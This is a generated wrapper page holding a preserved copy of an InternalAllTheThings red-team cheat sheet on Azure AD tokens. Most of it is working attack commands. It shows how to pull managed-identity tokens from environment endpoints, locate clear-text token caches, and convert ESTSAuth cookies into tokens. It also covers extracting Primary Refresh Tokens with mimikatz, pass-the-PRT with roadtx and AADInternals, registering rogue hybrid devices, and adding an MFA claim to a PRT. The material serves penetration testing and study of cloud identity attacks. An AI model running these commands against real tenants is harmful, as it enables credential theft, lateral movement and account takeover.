---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - Access and Tokens

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-access-and-token` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-access-and-token.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - Access and Tokens](../../topics/cloud/azure-ad-access-and-tokens.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-access-and-token |
| name | Azure AD - Access and Tokens |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-access-and-token.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - Access and Tokens\n\n## Connection\n\nWhen you authenticate to the Microsoft Graph API in PowerShell/CLI,\
  \ you will be using an application from a Microsoft's tenant.\n\n* [Microsoft Applications ID](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)\n\
  * [Entra ID First Party Apps & Scope Browser](https://entrascopes.com/)\n\n| Name                       | Application ID\
  \                       |\n|----------------------------|--------------------------------------|\n| Microsoft Azure PowerShell\
  \ | 1950a258-227b-4e31-a9cf-717495945fc2 |\n| Microsoft Azure CLI        | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |\n| Portail\
  \ Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |\n\nAfter a successfull authentication, you will get an access\
  \ token.\n\n### az cli\n\n* Login with credentials\n\n    ```ps1\n    az login -u <username> -p <password>\n    az login\
  \ --service-principal -u <app-id> -p <password> --tenant <tenant-id>\n    ```\n\n* Get token\n\n    ```ps1\n    az account\
  \ get-access-token\n    az account get-access-token --resource-type aad-graph\n    ```\n\nWhoami equivalent: `az ad signed-in-user\
  \ show`\n\n### Azure AD Powershell\n\n* Login with credentials\n\n    ```ps1\n    $passwd = ConvertTo-SecureString \"<PASSWORD>\"\
  \ -AsPlainText -Force\n    $creds = New-Object System.Management.Automation.PSCredential(\"test@<TENANT NAME>.onmicrosoft.com\"\
  , $passwd)\n    Connect-AzureAD -Credential $creds\n    ```\n\n### Az Powershell\n\n* Login with credentials\n\n    ```ps1\n\
  \    $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force\n    $creds = New-Object System.Management.Automation.PSCredential\
  \ (\"<USERNAME>@<TENANT NAME>.onmicrosoft.com\", $passwd)\n    Connect-AzAccount -Credential $creds\n    ```\n\n* Login\
  \ with service principal secret\n\n    ```ps1\n    $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force\n \
  \   $creds = New-Object System.Management.Automation.PSCredential('<APP-ID>', $password)\n    Connect-AzAccount -ServicePrincipal\
  \ -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d\n\n    ```\n\n* Get token\n\n    ```ps1\n    (Get-AzAccessToken\
  \ -ResourceUrl https://graph.microsoft.com).Token\n    Get-AzAccessToken -ResourceTypeName MSGraph\n    ```\n\n### Microsoft\
  \ Graph Powershell\n\n* Login with credentials\n\n    ```ps1\n    Connect-MgGraph\n    Connect-MgGraph -Scopes \"User.Read.All\"\
  , \"Group.ReadWrite.All\"\n    ```\n\n* Login with device code flow\n\n    ```ps1\n    Connect-MgGraph -Scopes \"User.Read.All\"\
  , \"Group.ReadWrite.All\" -UseDeviceAuthentication\n    ```\n\nWhoami equivalent: `Get-MgContext`\n\n### External HTTP API\n\
  \n* Login with credentials\n\n    ```ps1\n    # TODO\n    ```\n\n#### Device Code\n\nRequest a device code\n\n```ps1\n$body\
  \ = @{\n    \"client_id\" =     \"1950a258-227b-4e31-a9cf-717495945fc2\"\n    \"resource\" =      \"https://graph.microsoft.com\"\
  \n}\n$UserAgent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0\
  \ Safari/537.36\"\n$Headers=@{}\n$Headers[\"User-Agent\"] = $UserAgent\n$authResponse = Invoke-RestMethod `\n    -UseBasicParsing\
  \ `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" `\n   \
  \ -Headers $Headers `\n    -Body $body\n$authResponse\n```\n\nGo to device login [microsoft.com/devicelogin](https://login.microsoftonline.com/common/oauth2/deviceauth)\
  \ and input the device code. Then ask for an access token.\n\n```ps1\n$body=@{\n    \"client_id\" =  \"1950a258-227b-4e31-a9cf-717495945fc2\"\
  \n    \"grant_type\" = \"urn:ietf:params:oauth:grant-type:device_code\"\n    \"code\" =       $authResponse.device_code\n\
  }\n$Tokens = Invoke-RestMethod `\n    -UseBasicParsing `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0\"\
  \ `\n    -Headers $Headers `\n    -Body $body\n$Tokens\n```\n\n#### Service Principal\n\n* Request an access token using\
  \ a **service principal password**\n\n    ```ps1\n    curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token'\
  \ \\\n    --header 'Content-Type: application/x-www-form-urlencoded' \\\n    --data-urlencode 'client_id=<client-id>' \\\
  \n    --data-urlencode 'scope=https://graph.microsoft.com/.default' \\\n    --data-urlencode 'client_secret=<client-secret>'\
  \ \\\n    --data-urlencode 'grant_type=client_credentials'\n    ```\n\n#### App Secret\n\nAn App Secret (also called a client\
  \ secret) is a string used for securing communication between an application and Azure Active Directory (Azure AD). It is\
  \ a credential that the application uses along with its client ID to authenticate itself when accessing Azure resources,\
  \ such as APIs or other services, on behalf of a user or a system.\n\n```ps1\n$appid = '<app-id>'\n$tenantid = '<tenant-id>'\n\
  $secret = '<app-secret>'\n \n$body =  @{\n    Grant_Type    = \"client_credentials\"\n    Scope         = \"https://graph.microsoft.com/.default\"\
  \n    Client_Id     = $appid\n    Client_Secret = $secret\n}\n \n$connection = Invoke-RestMethod `\n    -Uri https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token\
  \ `\n    -Method POST `\n    -Body $body\n\nConnect-MgGraph -AccessToken $connection.access_token\n```\n\n### Internal HTTP\
  \ API\n\n> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.\n\
  \nFind `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` from the environment variables: `env`\n\nMost of the time, you want a token\
  \ for one of these resources:\n\n* <https://graph.microsoft.com>\n* <https://management.azure.com>\n* <https://storage.azure.com>\n\
  * <https://vault.azure.net>\n\n* PowerShell\n\n    ```ps1\n    curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01\"\
  \ -H secret:$IDENTITY_HEADER\n    curl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01\" -H\
  \ secret:$IDENTITY_HEADER\n    ```\n\n* Azure Function (Python)\n\n    ```py\n    import logging, os\n    import azure.functions\
  \ as func\n\n    def main(req: func.HttpRequest) -> func.HttpResponse:\n        logging.info('Python HTTP trigger function\
  \ processed a request.')\n        IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']\n        IDENTITY_HEADER = os.environ['IDENTITY_HEADER']\n\
  \        cmd = 'curl \"%s?resource=https://management.azure.com&apiversion=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT,\
  \ IDENTITY_HEADER)\n        val = os.popen(cmd).read()\n        return func.HttpResponse(val, status_code=200)\n    ```\n\
  \n## Access Token\n\nAn access token is a type of security token issued by Azure Active Directory (Azure AD) that grants\
  \ a user or application permission to access resources. These resources could be anything from APIs, web applications, data\
  \ stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.\n\nDecode access\
  \ tokens: [jwt.ms](https://jwt.ms/)\n\n* Use the access token with **MgGraph**\n\n    ```ps1\n    # use the jwt\n    $token\
  \ = \"eyJ0eXAiO...\"\n    $secure = $token | ConvertTo-SecureString -AsPlainText -Force\n    Connect-MgGraph -AccessToken\
  \ $secure\n    ```\n\n* Use the access token with **AzureAD**\n\n    ```powershell\n    Connect-AzureAD -AadAccessToken\
  \ <access-token> -TenantId <tenant-id> -AccountId <account-id>\n    ```\n\n* Use the access token with **Az Powershell**\n\
  \n    ```powershell\n    Connect-AzAccount -AccessToken <access-token> -AccountId <account-id>\n    Connect-AzAccount -AccessToken\
  \ <access-token> -GraphAccessToken <graph-access-token> -AccountId <account-id>\n    ```\n\n* Use the access token with\
  \ the **API**\n\n    ```powershell\n    $Token = 'eyJ0eX..'\n    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'\n\
  \    # $URI = 'https://graph.microsoft.com/v1.0/applications'\n    $RequestParams = @{\n        Method = 'GET'\n       \
  \ Uri = $URI\n        Headers = @{\n            'Authorization' = \"Bearer $Token\"\n        }\n    }\n    (Invoke-RestMethod\
  \ @RequestParams).value \n    ```\n\n### Access Token Locations\n\nTokens are stored by default on the disk in you use **Azure\
  \ Cloud Shell**. They canbe extracted by dumping the content of the storage account.\n\n* az cli\n    * az cli stores access\
  \ tokens in clear text in **accessTokens.json** in the directory `C:\\Users\\<username>\\.Azure`\n    * azureProfile.json\
  \ in the same directory contains information about subscriptions.\n\n* Az PowerShell\n    * Az PowerShell stores access\
  \ tokens in clear text in **TokenCache.dat** in the directory `C:\\Users\\<username>\\.Azure`\n    * It also stores **ServicePrincipalSecret**\
  \ in clear-text in **AzureRmContext.json**\n    * Users can save tokens using `Save-AzContext`\n\n## Refresh Token\n\n*\
  \ Requesting a token using credentials\n\n    ```ps1\n    TODO\n    ```\n\n### Get a Refresh Token from ESTSAuth Cookie\n\
  \n`ESTSAuthPersistent` is only useful when a CA policy actually grants a persistent session. Otherwise, you should use `ESTSAuth`.\n\
  \n```ps1\nTokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie \"0.AS8\"\nTokenTacticsV2> Get-AzureTokenFromESTSCookie\
  \ -Client MSTeams -ESTSAuthCookie \"0.AbcAp..\"\n```\n\n### Get a Refresh Token from Office process\n\n* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)\n\
  \n```ps1\nload bofloader\nexecute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i\
  \  7324\n```\n\n## FOCI Refresh Token\n\nFamily of client ids (FOCI) allows applications registered with Azure AD to share\
  \ tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the\
  \ same \"family.\"\n\n* [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt)\
  \ - Research into Undocumented Behavior of Azure AD Refresh Tokens\n\n**Generate tokens**\n\n```ps1\nroadtx gettokens --refresh-token\
  \ <refresh-token> -c <foci-id> -r https://graph.microsoft.com \nroadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46\n\
  ```\n\n```ps1\nscope               resource                                client                              \n.default\
  \            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46\n                    1950a258-227b-4e31-a9cf-717495945fc2\
  \    1950a258-227b-4e31-a9cf-717495945fc2\n                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2\n\
  \                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46\n                    https://graph.windows.net\
  \               00b41c95-dab0-4487-9791-b9d2c32c80f2\n                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46\n\
  \                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2\n                    \
  \                                        04b07795-8ddb-461a-bbee-02f9e1bf7b46\nFiles.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c\
  \    d3590ed6-52b3-4102-aeff-aad2292ab01c\n                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c\n\
  \                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264\nMail.ReadWrite.All  https://graph.microsoft.com\
  \             00b41c95-dab0-4487-9791-b9d2c32c80f2\n                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2\n\
  \                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2\n```\n\n## Primary Refresh\
  \ Token\n\nA Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's\
  \ Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience\
  \ on devices.\n\n:warning: A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However,\
  \ it's only valid for 14 days if the device is not in use.\n\n* Use PRT token\n\n    ```ps1\n    roadtx browserprtauth --prt\
  \ <prt-token> --prt-sessionkey <session-key>\n    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com\n  \
  \  ```\n\n### Extract PRT v1 - Pass-the-PRT\n\nMimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD\
  \ joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single\
  \ sign-on).\n\n* Use mimikatz to extract the PRT and session key\n\n    ```ps1\n    mimikatz # privilege::debug\n    mimikatz\
  \ # token::elevate\n    mimikatz # sekurlsa::cloudap\n    mimikatz # sekurlsa::dpapi\n    mimikatz # dpapi::cloudapkd /keyvalue:<key-value>\
  \ /unprotect\n    mimikatz # dpapi::cloudapkd /context:<context> /derivedkey:<derived-key> /Prt:<prt>\n    ```\n\n* Use\
  \ either roadtx or AADInternals to generate a new PRT token\n\n    ```ps1\n    roadtx browserprtauth --prt <prt> --prt-sessionkey\
  \ <clear-key> --keep-open -url https://portal.azure.com\n\n    PS> Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1\n\
  \    PS AADInternals> $PRT_OF_USER = '...'\n    PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \"=\"}\n\
  \    PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))\n    PS AADInternals>\
  \ $ClearKey = \"XXYYZZ...\"\n    PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..',\
  \ '0x$&,' -split ',' -ne ''))\n    PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce\n\
  \    ```\n\n### Extract PRT on Device with TPM\n\n* No method known to date.\n\n### Request a PRT using the Refresh Flow\n\
  \n* Request a nonce from AAD: `roadrecon auth --prt-init -t <tenant-id>`\n* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken)\
  \ or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.\n* `roadrecon auth\
  \ --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`\n\
  * Then browse to [login.microsoftonline.com](https://login.microsoftonline.com) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`\n\
  \n    ```powershell\n    Name: x-ms-RefreshTokenCredential\n    Value: <Signed JWT>\n    HttpOnly: √\n    ```\n\n:warning:\
  \ Mark the cookie with the flags `HTTPOnly` and `Secure`.\n\n### Request a PRT with Hybrid Device\n\nRequirements:\n\n*\
  \ ADDS user credentials\n* hybrid environment (ADDS and Azure AD)\n\nUse the user account to create a computer and request\
  \ a PRT\n\n* Create a computer account in AD: `impacket-addcomputer <domain>/<username>:<password> -dc-ip <dc-ip>`\n* Configure\
  \ the computer certificate in AD with [dirkjanm/roadtools_hybrid](https://github.com/dirkjanm/roadtools_hybrid): `python\
  \ setcert.py 10.10.10.10  -t '<machine-account$>' -u '<domain>\\<machine-account$>' -p <machine-password>`\n* Register the\
  \ hybrid device in Azure AD with this certificate: `roadtx hybriddevice -c '<machine-account>.pem' -k '<machine-account>.key'\
  \ --sid '<device-sid>' -t '<aad-tenant-id>'`\n* Get a PRT with device claim\n\n    ```ps1\n    roadtx prt -c <hybrid-device-name>.pem\
  \ -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>\n    roadtx browserprtauth --prt <prt-token> --prt-sessionkey\
  \ <prt-session-key> --keep-open -url https://portal.azure.com\n    ```\n\n### Upgrade Refresh Token to PRT\n\n* Get correct\
  \ token audience: `roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net\
  \ --refresh-token file`\n* Registering device: `roadtx device -a register -n <device-name>`\n* Request PRT `roadtx prt --refresh-token\
  \ <refresh-token> -c <device-name>.pem -k <device-name>.key`\n* Use a PRT: `roadtx browserprtauth --prt <prt-token> --prt-sessionkey\
  \ <prt-session-key> --keep-open -url https://portal.azure.com`\n\n### Enriching a PRT with MFA claim\n\n* Request a special\
  \ refresh token: `roadtx prtenrich -u username@domain`\n* Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c\
  \ <device>.pem -k <device>.key`\n\n## References\n\n* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan\
  \ Mollema - April 16, 2020](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)\n*\
  \ [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)\n\
  * [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)\n* [PRT Abuse from\
  \ Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)\n\
  * [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)\n\
  * [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020](https://aadinternals.com/post/prt/)\n\
  * [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)\n\
  * [Attacking Azure Cloud shell - Karl Fosaaen - December 10, 2019](https://blog.netspi.com/attacking-azure-cloud-shell/)\n\
  * [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)\n\
  * [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)\n\
  * [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)\n* [Understanding\
  \ Tokens in Entra ID: A Comprehensive Guide - Lina Lau - September 18, 2024](https://www.xintra.org/blog/tokens-in-entra-id-guide)"
_relative_path: cloud/azure/azure-access-and-token.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-access-and-token.md
````
